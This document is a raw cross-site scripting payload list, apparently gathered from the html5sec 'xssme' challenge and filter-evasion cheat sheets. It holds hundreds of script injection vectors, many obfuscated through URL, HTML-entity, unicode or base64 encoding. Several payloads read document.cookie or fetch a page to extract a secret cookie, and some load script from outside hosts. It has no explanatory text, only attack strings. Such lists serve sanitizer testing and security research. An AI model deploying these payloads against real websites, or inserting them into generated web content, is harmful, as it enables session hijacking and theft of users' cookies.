xzdsds\"%29%29;}catch%28e%29{alert%28document.domain%29;}//<img src=x onerror=prompt(0);>
<iframe/onload=prompt(0);>
<svg/onload=prompt(0);> 
<script> document.getElementById(%22safe123%22).setCapture(); document.getElementById(%22safe123%22).click(); </script>">
<script>Object.defineProperties(window, {Safe: {value: {get: function() {return document.cookie}}}});alert(Safe.get())</script>">
<script>var x = document.createElement('iframe');document.body.appendChild(x);var xhr = x.contentWindow.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();</script>">
<script>(function() {var event = document.createEvent(%22MouseEvents%22);event.initMouseEvent(%22click%22, true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);var fakeData = [event, {isTrusted: true}, event];arguments.__defineGetter__('0', function() { return fakeData.pop(); });alert(Safe.get.apply(null, arguments));})();</script>">
<script>var script = document.getElementsByTagName('script')[0]; var clone = script.childNodes[0].cloneNode(true); var ta = document.createElement('textarea'); ta.appendChild(clone); alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>">
<script>xhr=new ActiveXObject(%22Msxml2.XMLHTTP%22);xhr.open(%22GET%22,%22/xssme2%22,true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();</script>">
<script>alert(document.documentElement.innerHTML.match(/'([^']%2b)/)[1])</script>">
<script>alert(document.getElementsByTagName('html')[0].innerHTML.match(/'([^']%2b)/)[1])</script>">
<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>">
<script> var xdr = new ActiveXObject(%22Microsoft.XMLHTTP%22);  xdr.open(%22get%22, %22/xssme2%3Fa=1%22, true); xdr.onreadystatechange = function() { try{   var c;   if (c=xdr.responseText.match(/document.cookie = '(.*%3F)'/) )    alert(c[1]); }catch(e){} };  xdr.send(); </script>">
<iframe id=%22ifra%22 src=%22/%22></iframe> <script>ifr = document.getElementById('ifra'); ifr.contentDocument.write(%22<scr%22 %2b %22ipt>top.foo = Object.defineProperty</scr%22 %2b %22ipt>%22); foo(window, 'Safe', {value:{}}); foo(Safe, 'get', {value:function() {    return document.cookie }}); alert(Safe.get());</script>">
<script>alert(document.head.innerHTML.substr(146,20));</script>">
<script>alert(document.head.childNodes[3].text)</script>">
<script>var request = new XMLHttpRequest();request.open('GET', 'http://html5sec.org/xssme2', false);request.send(null);if (request.status == 200){alert(request.responseText.substr(150,41));}</script>">
<script>Object.defineProperty(window, 'Safe', {value:{}});Object.defineProperty(Safe, 'get', {value:function() {return document.cookie}});alert(Safe.get())</script>">
<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%22)};document.body.appendChild(x);</script>">
<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>Object.defineProperty(parent,'Safe',{value:{}});Object.defineProperty(parent.Safe,'get',{value:function(){return top.document.cookie}});alert(parent.Safe.get())<\/script>%22)};document.body.appendChild(x);</script>">
<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>">
<script> document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click({'type':'click','isTrusted':true}); </script>">
<script> var+MouseEvent=function+MouseEvent(){}; MouseEvent=MouseEvent var+test=new+MouseEvent(); test.isTrusted=true; test.type='click';  document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click(test); </script>">
<script>  (function (o) {   function exploit(x) {    if (x !== null)     alert('User cookie is ' %2B x);    else     console.log('fail');   }      o.onclick = function (e) {    e.__defineGetter__('isTrusted', function () { return true; });    exploit(Safe.get());   };      var e = document.createEvent('MouseEvent');   e.initEvent('click', true, true);   o.dispatchEvent(e);  })(document.getElementById('safe123')); </script>">
<iframe src=/ onload=eval(unescape(this.name.replace(/\/g,null))) name=fff%253Dnew%2520this.contentWindow.window.XMLHttpRequest%2528%2529%253Bfff.open%2528%2522GET%2522%252C%2522xssme2%2522%2529%253Bfff.onreadystatechange%253Dfunction%2528%2529%257Bif%2520%2528fff.readyState%253D%253D4%2520%2526%2526%2520fff.status%253D%253D200%2529%257Balert%2528fff.responseText%2529%253B%257D%257D%253Bfff.send%2528%2529%253B></iframe>">
<script>     function b() { return Safe.get(); } alert(b({type:String.fromCharCode(99,108,105,99,107),isTrusted:true})); </script> ">
<img src=http://www.google.fr/images/srpr/logo3w.png onload=alert(this.ownerDocument.cookie) width=0 height= 0 /> #">
<script>  function foo(elem, doc, text) {   elem.onclick = function (e) {    e.__defineGetter__(text[0], function () { return true })    alert(Safe.get());   };      var event = doc.createEvent(text[1]);   event.initEvent(text[2], true, true);   elem.dispatchEvent(event);  } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerDocument,this.name.split(/,/)) name=isTrusted,MouseEvent,click width=0 height=0 /> # ">
<SCRIPT+FOR=document+EVENT=onreadystatechange>MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;getElementById(%22safe123%22).click=function()+{alert(Safe.get());};getElementById(%22safe123%22).click(test);</SCRIPT>#">
<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>#">
<video+onerror='javascript:MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());};document.getElementById(%22safe123%22).click(test);'><source>%23">
<script for=document event=onreadystatechange>getElementById('safe123').click()</script>">
<script> var+x+=+showModelessDialog+(this); alert(x.document.cookie); </script>">
<hr>
<script> location.href = 'data:text/html;base64,PHNjcmlwdD54PW5ldyBYTUxIdHRwUmVxdWVzdCgpO3gub3BlbigiR0VUIiwiaHR0cDovL3hzc21lLmh0bWw1c2VjLm9yZy94c3NtZTIvIix0cnVlKTt4Lm9ubG9hZD1mdW5jdGlvbigpIHsgYWxlcnQoeC5yZXNwb25zZVRleHQubWF0Y2goL2RvY3VtZW50LmNvb2tpZSA9ICcoLio/KScvKVsxXSl9O3guc2VuZChudWxsKTs8L3NjcmlwdD4='; </script>">
<iframe src=%22404%22 onload=%22frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>">
<iframe src=%22404%22 onload=%22content.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>">
<iframe src=%22404%22 onload=%22self.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>">
<iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>">
<script>var x = safe123.onclick;safe123.onclick = function(event) {var f = false;var o = { isTrusted: true };var a = [event, o, event];var get;event.__defineGetter__('type', function() {get = arguments.callee.caller.arguments.callee;return 'click';});var _alert = alert;alert = function() { alert = _alert };x.apply(null, a);(function() {arguments.__defineGetter__('0', function() { return a.pop(); });alert(get());})();};safe123.click();</script>#">
<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();">
<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>">
<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fhtml5sec.org%252Fxssme2'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\/script%26gt;\%26quot;%26quot;) autofocus></textarea>">
<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();">
<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>">
<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src=%22javascript:parent.x(window)%22><iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();">
<textarea id=ta onfocus=%22write('<script>alert(1)</script>')%22 autofocus></textarea>">
<object data=%22data:text/html;base64,PHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsgYWxlcnQoeGhyLnJlc3BvbnNlVGV4dC5tYXRjaCgvY29va2llID0gJyguKj8pJy8pWzFdKSB9OyB4aHIuc2VuZCgpOyA8L3NjcmlwdD4=%22>">
<script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();">

<hr>

%3Cscript%3Exhr=new%20ActiveXObject%28%22Msxml2.XMLHTTP%22%29;xhr.open%28%22GET%22,%22/xssme2%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readyState==4%26%26xhr.status==200%29{alert%28xhr.responseText.match%28/%27%28[^%27]%2b%29/%29[1]%29}};xhr.send%28%29;%3C/script%3E">
<iframe src=`http://xssme.html5sec.org/?xss=<iframe onload=%22xhr=new XMLHttpRequest();xhr.open('GET','http://html5sec.org/xssme2',true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();%22>`>">
<li><a target="x" href="xssme?xss=%3Cscript%3EaddEventListener%28%22DOMFrameContentLoaded%22,%20function%28e%29%20{e.stopPropagation%28%29;},%20true%29;%3C/script%3E%3Ciframe%20src=%22data:text/html,%253cscript%253eObject.defineProperty%28top,%20%27MyEvent%27,%20{value:%20Object,%20configurable:%20true}%29;function%20y%28%29%20{alert%28top.Safe.get%28%29%29;};event%20=%20new%20Object%28%29;event.type%20=%20%27click%27;event.isTrusted%20=%20true;y%28event%29;%253c/script%253e%22%3E%3C/iframe%3E">
<li><a target="x" href="xssme?xss=<script>var cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101))(doc.location.hash)</script>#<iframe src=data:text/html;base64,PHNjcmlwdD5ldmFsKGF0b2IobmFtZSkpPC9zY3JpcHQ%2b name=ZG9jPUNvbXBvbmVudHMubG9va3VwTWV0aG9kKHRvcC50b3AsJ2RvY3VtZW50JykoKTt2YXIgZmlyZU9uVGhpcyA9ICBkb2MuZ2V0RWxlbWVudEJ5SWQoJ3NhZmUxMjMnKTt2YXIgZXZPYmogPSBkb2N1bWVudC5jcmVhdGVFdmVudCgnTW91c2VFdmVudHMnKTtldk9iai5pbml0TW91c2VFdmVudCggJ2NsaWNrJywgdHJ1ZSwgdHJ1ZSwgd2luZG93LCAxLCAxMiwgMzQ1LCA3LCAyMjAsIGZhbHNlLCBmYWxzZSwgdHJ1ZSwgZmFsc2UsIDAsIG51bGwgKTtldk9iai5fX2RlZmluZUdldHRlcl9fKCdpc1RydXN0ZWQnLGZ1bmN0aW9uKCl7cmV0dXJuIHRydWV9KTtmdW5jdGlvbiB4eChjKXtyZXR1cm4gdG9wLlNhZmUuZ2V0KCl9O2FsZXJ0KHh4KGV2T2JqKSk></iframe>">
<li><a target="x" href="xssme?xss=<script>find('cookie'); var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe.createNSResolver(doc); var result = xpe.evaluate('//script/text()', doc, nsResolver, 0, null); alert(result.iterateNext().data.match(/cookie = '(.*?)'/)[1])</script>">
<li><a target="x" href="xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();">
Garethy Salty Method!<script>alert(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(this,'window')(),'document')(), 'getElementsByTagName')('html')[0],'innerHTML')().match(/d.*'/));</script>"> a(1)
a(1);
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
 
2) <div onmouseover='alert&lpar;1&rpar;'>DIV</div>
 
3) <iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
 
4) <a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
 
5) <embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"> ​
 
6) <object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">​
 
7) <var onmouseover="prompt(1)">On Mouse Over</var>​
 
8) <a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
 
9) <img src="/" =_=" title="onerror='prompt(1)'">
 
10) <%<!--'%><script>alert(1);</script -->
 
11) <script src="data:text/javascript,alert(1)"></script>
 
12) <iframe/src \/\/onload = prompt(1)
 
13) <iframe/onreadystatechange=alert(1)
 
14) <svg/onload=alert(1)
 
15) <input value=<><iframe/src=javascript:confirm(1)
 
16) <input type="text" value=``<div/onmouseover='alert(1)'>X</div>
 
17) http://www.<script>alert(1)</script .com
 
 
18) <iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ​
 
19) <svg><script ?>alert(1)
 
20) <iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
 
21) <img src=`xx:xx`onerror=alert(1)>
 
22) <object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
 
23) <meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>​
 
24) <math><a xlink:href="//jsfiddle.net/t846h/">click
 
25) <embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>​
 
26) <svg contentScriptType=text/vbs><script>MsgBox+1
 
27) <a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
 
28) <iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
 
29) <script>~'\u0061' ;  \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
 
30) <script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
 
31)  <script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script ​​​​​​​​​​​​
 
32) <object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
 
33) <script>+-+-1-+-+alert(1)</script>
 
34) <body/onload=&lt;!--&gt;&#10alert(1)>
 
35) <script itworksinallbrowsers>/*<script* */alert(1)</script ​
 
36) <img src ?itworksonchrome?\/onerror = alert(1)​​​
 
37) <svg><script>//&NewLine;confirm(1);</script </svg>
 
38) <svg><script onlypossibleinopera:-)> alert(1)
 
39) <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
 
40) <script x> alert(1) </script 1=2
 
41) <div/onmouseover='alert(1)'> style="x:">
 
42)  <--`<img/src=` onerror=alert(1)> --!>
 
43)  <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ​
 
44) <div  style="position:absolute;top:0;left:0;width:100%;height:100%"  onmouseover="prompt(1)" onclick="alert(1)">x</button>​
 
45) "><img src=x onerror=window.open('https://www.google.com/');>
%22%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E
&#x22;&#x3E;&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;
&#34&#62&#60&#115&#99&#114&#105&#112&#116&#62&#97&#108&#101&#114&#116&#40&#49&#41&#60&#47&#115&#99&#114&#105&#112&#116&#
62Ij48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+
 
46) <form><button formaction=javascript&colon;alert(1)>CLICKME
 
47) <math><a xlink:href="//jsfiddle.net/t846h/">click
 
48) <object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>​
 
49) <iframe  src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
 
<iframe
 id="test"
 src="http://html5sec.org/xssme?xss=%20href=javascript:alert(location.host)%20x="
 sandbox
style="width: 100%; height: 100%;"></iframe>
 
<script>
 var iframe = document.getElementById('test');
 iframe.addEventListener('load', function() {
  iframe.sandbox = 'allow-scripts';
 });
</script>
a=o.a;
1&&0//0
1||2//1
1&&2//2
i=alert
0||1//1 
\u9999(1)
\u9998(1)
$\u5003=1
\u55FF=-1
_(a)(1); 
-alert(1)
c=e(s+a);
\u5001$=1
+-alert(1)
\u9997(1) 
\u5000$(1)
\u5001_=-1
0/alert(1)
--alert(1)
a=#1=alert;
\u002f/test
&#54280;=-1
[-alert(1)]
/\u002ftest
'test\u0027;
/test\u002f;
\u0022test";
\u0027test';
\u9997=alert
\u9998=alert
\u9999=alert
"test\u0022;
\u002ftest/;
@cc_off@cc_on
''in alert(1)
0 == ''//true
\u0061lert(1) 
v=(/t/+[])[1];
y=(/o/+[])[1];
z=(/C/+[])[1];
d=(/./+[])[1];
o=(/n/+[])[1];
<alert(/xss2/)
t=String(v+y);
x=(/r/+[])[1];
alert\u000a(1)
/^/in alert(1)
alert\u000D(1)
alert\u2028(1)
alert\u2029(1)
'); alert('XSS
i=(/i/+[])[1];
delete alert(1)
0 == '0'//true 
<SCRIPT>a=/XSS/
window.alert(1)
alert(o2.test);
alert(o1.test);
o2 = clone(o1);
o={a:#1=alert};
throw alert(1) 
typeof alert(1)
<? echo('<SCR)';
<;HTML>;<;BODY>;
top["alert"](6);
undefined=alert;
~[,].map(prompt)
'' == '0'//false
<HTML xmlns:xss>
x=new VBArray(a);
""@cc_on/alert(1)
/**\u002falert(1)
Simple version...
\u002f**/alert(1)
x=[].x=[].y=alert
0[\u55FD](\u55FC)
this["alert"](7);
\u50002=/eva/[-1]
'>//\\,<'>">">"*"
<;SCRIPT>;a=/XSS/
";alert('XSS');//
\";alert('XSS');//
'';!--"<XSS>=&{()}
&#47&#46source&#41
//</script><?='µ';
0/eval('alert(1)')
alert(1)[alert(2)]
window['alert'](1)
'>//\\,<'>">">"*"4
<;HTML xmlns:xss>;
x[{}].valueOf()(1) 
[1,2].reduce(alert)
false == '0'//true 
x[{}]=!/\\/?{}:eval
instanceof alert(1)
x='aler\u200ft(1)' 
eval(RegExp['$&']) 
o2.test = 'hello2';
alert((3).clone());
var array = [1,2,3]
alert(array.pop(3))
window["alert"](1);
alert(bs("window"))
<;? echo(';<;SCR)';;
x[/\\/].valueOf()(1)
x[{}]=!/\\/?[]:alert
RegExp(/a/,alert(1))
!alert(2)in!alert(1)
new Date in alert(1)
a=__proto__['alert']
\u000Aalert\u000A(1)
Script('/'.concat(/\
0..eval('alert(1)') 
\";;alert(';XSS';);//
e=<a>ev<b></b>al</a> 
alert(1)/@works_in_ff
alert(1)-alert(/two/)
o1 = {test:'hello1'};
alert(clone.clone());
function Anything(){}
(i[-5]['eval'](i))(1)
this._=window.a=null;
<SCRIPT>alert("Test")
(1<1>alert(false)<1>1)
<SCRIPT>alert("Test");
<object data=//h4k.in>
alert("test".clone());
(1<<1>>alert(2)<<1>>1)
> delete ,delete a(1) 
> delete~/delete a(1) 
['alert(1)'].map(eval)
@cc_on@_win32/alert(1) 
if(false);else~alert(1)
false == 'false'//false
['alert(1)'].some(eval)
0[\u50002+'l'](\u50003)
alert(1)['*(&£%(*&£^(']
['alert(1)'].every(eval)
<IMG SRC="mocha:[code]">
  <xss:xss>XSS</xss:xss>
alert(a.source)</SCRIPT>
14) <svg/onload=alert(1)
e=self[490837[t+s](32)];
and a fun huge button :)
x[/\\/]=!/\\/?/\\/:alert
$\u5001=/\u00/[-$\u5003]
new RegExp(/a/,alert(1))
typeof AnYThing^alert(1)
SyntaxError[a=#1=alert];
a=0[eval[-6]](alert[-6])
onmouseover=alert(1)//" 
';';;!--";<;XSS>;=&;{()}
([],[].sort)() == window 
'); alert('xss'); var x='
<base href='javascript:'>
['alert(1)'].filter(eval)
['alert(1)',1].sort(eval)
\u5001_[\u5002_](\u5003_)
x=[/&/,alert,/&/][1],x(1)
top.* =alert,self['*'](1)
x=[1,2,3].input=alert,4,5
for (i in array) alert(i)
a+'lert'=='alert'? Sure! 
alert(1)/).concat(/ /))()
<img src='alert("w00f");'>
\u002f**/alert(1)\u002f**/
<A HREF="//google">XSS</A>
window.alert("Bonjour !");
<BODY ONLOAD=alert('XSS')>
<script>alert(1);</script>
<frameset onload=alert(1)>
<BODY ONLOAD=alert(’XSS’)>
alert(<a>alert(false)</a>)
['alert(1)'].forEach(eval)
<img onerror=alert(/1/) / >
<!-- alert(/WTF XSS3/)`--> 
['alert(1)',1].reduce(eval)
x=[].reverse,x() === window
0?1:!1?0:0?1:1/alert(1)?1:1
-Math.abs[(+alert(/boo/))] 
window.top.window.alert(4);
19) <svg><script ?>alert(1)
<BR SIZE="&{alert('XSS')}">
"><script>alert(0)</script>
j=String((/j/+[])[1]+y+i+o);
document.designMode=/On/[-1]
%22%2Balert(%27XSS%27)%2B%22
delete~[a=alert]/delete a(1)
alternative to toString()...
<;IMG SRC=";mocha:[code]";>;
0.[!0?/eval/[~0]:$](name).@_
&#54280;[&#21477;](&#22924;)
0[/eval/[-$\u5003]]($\u5002)
<body onLoad="alert('XSS');"
<SCRIPT>alert('XSS')</SCRIPT>
({}=[].concat)()[0] == window
<img src \/onerror = alert(2)
x[/\\/]+=!/\\/?{}:(/ert/)[-1]
\u5000$=\u5001$?alert:\u5001$
\u55FD=RegExp(/eval/)[\u55FF]
'xxxalert(1)'.match(/[^x]+/);
i=alert;(i[-5]['eval'](i))(1)
<b <script>alert(1)</script>0
¼script¾alert(¢XSS¢)¼/script¾
<br size=\"&{alert('XSS')}\">
\\'); alert(\'xss\');var x=\'
<IMG SRC="livescript:[code]">
&{document.vulnerable=true;};
delete [a=alert],delete a(1) 
<SCRIPT>alert('XSS');</SCRIPT>
<;BODY ONLOAD=alert(';XSS';)>;
<input type="text" USER_INPUT>
/onload=alert(/xss/)></iframe>
default xml namespace=(e)=eval
<script>alert(»XSS«)</script> 
Works for any global object :D
Function('a','\al\ert(a)')(1) 
<SCRIPT SRC=//ha.ckers.org/.j>
scriptalertdocumentcookiescript
\";document.vulnerable=true;;//
alert("8:"+document["cookie"]);
\u50003=0[\u50002+'l'](\u50001)
x[/\\/]=(/:/)[-0]?{}:(/al/)[-1]
<form id="location" href="bar">
<IMG STYLE='no\xss:noxss("/*");
alert("1"["replace"]('1','9'));
a=<test>al<!---->ert(1)</test> 
='><script>alert("xss")</script>
try{IE=window=!1}catch(e){IE=!0}
[].sort.call(null).alert('lose')
<script<{alert(1)}/></script </>
for(_=console.dir;_==_;_(_))_(_)
default xml namespace = alert(1)
<object classid="clsid:..." cod.
" onmousemove=alert("XSS") "> <"
<SCRIPT> alert(“XSS”); </SCRIPT>
<;SCRIPT SRC=//ha.ckers.org/.j>;
<;A HREF=";//google";>;XSS<;/A>;
[1,'alert(1)'].reduceRight(eval)
javascript:alert(function()1+1);
g:0in~/*for another*/~alert(!!1) 
<IMG SRC=JaVaScRiPt:alert('XSS')>
</br style=a:expression(alert())>
'">><script>alert('XSS')</script>
<div id=&#42&#x2f&#13&#40&#47XSS1
<body onload=&lt;!--&#10alert(1)>
new Function("return '\141'")(); 
\u55FC=RegExp(/alert(1)/)[\u55FF]
<IMG SRC=javascript:alert("XSS")>
>"'><script>alert(‘XSS')</script>
<;IMG SRC=";livescript:[code]";>;
>"><script>alert("XSS")</script>&
<<SCRIPT>alert("XSS");//<</SCRIPT>
<input onfocus=write(1) autofocus>
<_ />/<_ />+~~~~~~<_{alert(1)} /> 
foo\’; alert(document.cookie);//’;
typeof setTimeout('alert(this)',0)
<object data=javascript:\alert(1)>
harmless=" onmouseover=alert(1)//"
<input autofocus onfocus=alert(1)>
<;BR SIZE=";&;{alert(';XSS';)}";>;
&{document.write("XSS-XSS-XSS");};
<x style="behavior:url(test.sct)">
<IMG SRC="javascript:alert('XSS')"
<IMG SRC='vbscript:msgbox("XSS")'>
'>><marquee><h1>XSS</h1></marquee>
<XML SRC="xsstest.xml" ID=I></XML>
